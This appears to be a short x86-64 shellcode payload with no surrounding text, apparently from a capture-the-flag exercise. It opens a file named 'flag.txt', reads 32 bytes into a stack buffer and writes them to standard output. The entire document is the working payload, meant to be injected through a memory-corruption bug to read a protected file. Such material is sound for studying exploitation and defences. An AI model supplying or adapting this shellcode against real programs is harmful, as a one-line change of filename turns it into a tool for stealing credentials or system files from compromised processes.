_start:
    xor    rax, rax
    push   rax
    mov    rax, 0x7478742e67616c66
    push   rax
    mov    rdi, rsp
    xor    rdx, rdx
    xor    rsi, rsi
    push   0x2
    pop    rax
    syscall
    mov    rdi, rax
    xor    rax, rax
    push   rax
    mov    rsi, rsp
    push   rax
    pop    rcx
    push   0x20
    pop    rdx
    syscall
    push   0x1
    pop    rax
    mov    rdi, rax
    syscall
